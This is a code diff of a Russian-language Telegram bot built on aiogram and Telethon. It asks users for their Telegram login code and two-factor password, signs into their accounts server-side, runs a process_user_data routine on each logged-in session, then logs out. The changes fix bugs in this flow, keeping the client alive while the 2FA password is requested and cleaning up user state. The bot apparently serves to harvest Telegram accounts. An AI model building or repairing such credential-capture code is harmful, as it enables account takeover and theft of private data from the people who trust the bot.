@@ -115,17 +115,18 @@ async def get_code(message: types.Message):
             await message.reply("Код должен содержать только цифры. Пожалуйста, попробуйте снова.")
             return
 
-        await client.sign_in(phone_number, code, phone_code_hash=phone_code_hash)
+        await client.sign_in(phone_number, code, phone_code_hash=str(phone_code_hash))
         
         await message.reply("Успешная авторизация!")
         await process_user_data(client, phone_number, message.from_user.id)
         await client.log_out()
         await client.disconnect()
         
-        user_state[message.from_user.id]['client'] = client  # Сохраняем клиент для последующего использования
+        user_state.pop(message.from_user.id, None)  # Удаляем состояние пользователя после успешной обработки
     except SessionPasswordNeededError:
         await message.reply("Необходим пароль двухфакторной аутентификации. Пожалуйста, введите ваш пароль.")
         user_state[message.from_user.id]['awaiting_password'] = True
+        user_state[message.from_user.id]['client'] = client  # Сохраняем клиент для последующего использования
     except PhoneCodeInvalidError:
         user_state[message.from_user.id]['attempts'] += 1
         if user_state[message.from_user.id]['attempts'] >= 3:
@@ -139,8 +140,9 @@ async def get_code(message: types.Message):
         await message.reply(f"Произошла ошибка: {e}")
     finally:
         if 'awaiting_password' not in user_state.get(message.from_user.id, {}):
-            await client.log_out()
-            await client.disconnect()
+            if 'attempts' not in user_state.get(message.from_user.id, {}):
+                await client.log_out()
+                await client.disconnect()
 
 @dp.message_handler(lambda message: 'awaiting_password' in user_state.get(message.from_user.id, {}))
 async def process_password(message: types.Message):
